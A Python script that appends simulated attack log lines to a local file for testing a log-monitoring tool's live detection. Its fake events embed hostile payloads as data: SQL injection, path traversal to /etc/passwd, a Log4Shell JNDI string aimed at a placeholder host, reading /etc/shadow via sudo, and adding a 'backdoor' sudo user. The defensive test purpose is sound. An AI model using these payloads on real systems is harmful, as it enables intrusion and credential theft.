#!/usr/bin/env python3
"""Append FAKE attack log lines to a test file so you can watch --follow detect them live.

This only writes text to a local file. It does not touch the network or any real service.

Terminal 1:  python main.py --follow --log sample_logs/live_test.log
Terminal 2:  python tools/simulate_events.py --file sample_logs/live_test.log --scenario all
"""
import argparse
import random
import time
from datetime import datetime
from pathlib import Path

HOST = "lab-server"


def stamp():
    n = datetime.now()
    return f"{n.strftime('%b')} {n.day:2d} {n.strftime('%H:%M:%S')}"


def web_stamp():
    return datetime.now().astimezone().strftime("%d/%b/%Y:%H:%M:%S %z")


def scenarios(ip="203.0.113.99"):
    pid = random.randint(2000, 9000)
    users = ["admin", "root", "test", "oracle", "ubuntu", "pi", "git", "postgres"]
    yield "brute", [f"{stamp()} {HOST} sshd[{pid + i}]: Failed password for {'invalid user ' if u != 'root' else ''}{u} from {ip} port {40000 + i} ssh2"
                    for i, u in enumerate(users + users)]
    yield "takeover", [f"{stamp()} {HOST} sshd[{pid}]: Accepted password for admin from {ip} port 40100 ssh2",
                       f"{stamp()} {HOST} sudo[{pid}]:    admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
                       f"{stamp()} {HOST} useradd[{pid}]: new user: name=backdoor, UID=1010, GID=1010, home=/home/backdoor, shell=/bin/bash",
                       f"{stamp()} {HOST} usermod[{pid}]: add 'backdoor' to group 'sudo'"]
    yield "web", [f'{ip} - - [{web_stamp()}] "GET {p} HTTP/1.1" 200 512 "-" "{ua}"' for p, ua in [
        ("/products?id=1%27%20OR%20%271%27=%271", "Mozilla/5.0"),
        ("/download?f=../../../../etc/passwd", "Mozilla/5.0"),
        ("/", "${jndi:ldap://198.51.100.1:1389/x}"),
        ("/.env", "Mozilla/5.0"),
        ("/", "sqlmap/1.7.2")]]
    yield "portscan", [f"{stamp()} {HOST} kernel: [99.{i}] [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=10.0.0.5 LEN=44 PROTO=TCP SPT=4444 DPT={p}"
                       for i, p in enumerate([21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 3389, 8080])]
    yield "sudo", [f"{stamp()} {HOST} sudo[{pid}]: pam_unix(sudo:auth): authentication failure; logname=intern uid=1003 euid=0 tty=/dev/pts/1 ruser=intern rhost=  user=intern"
                   for _ in range(3)]


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--file", type=Path, default=Path("sample_logs/live_test.log"))
    ap.add_argument("--scenario", default="all", help="brute, takeover, web, portscan, sudo, or all")
    ap.add_argument("--delay", type=float, default=0.15, help="seconds between lines")
    args = ap.parse_args()
    args.file.parent.mkdir(parents=True, exist_ok=True)
    args.file.touch(exist_ok=True)
    with args.file.open("a", encoding="utf-8") as fh:
        for name, lines in scenarios():
            if args.scenario not in ("all", name):
                continue
            print(f"[sim] writing scenario '{name}' ({len(lines)} lines) to {args.file}")
            for line in lines:
                fh.write(line + "\n")
                fh.flush()
                time.sleep(args.delay)
    print("[sim] done")


if __name__ == "__main__":
    main()
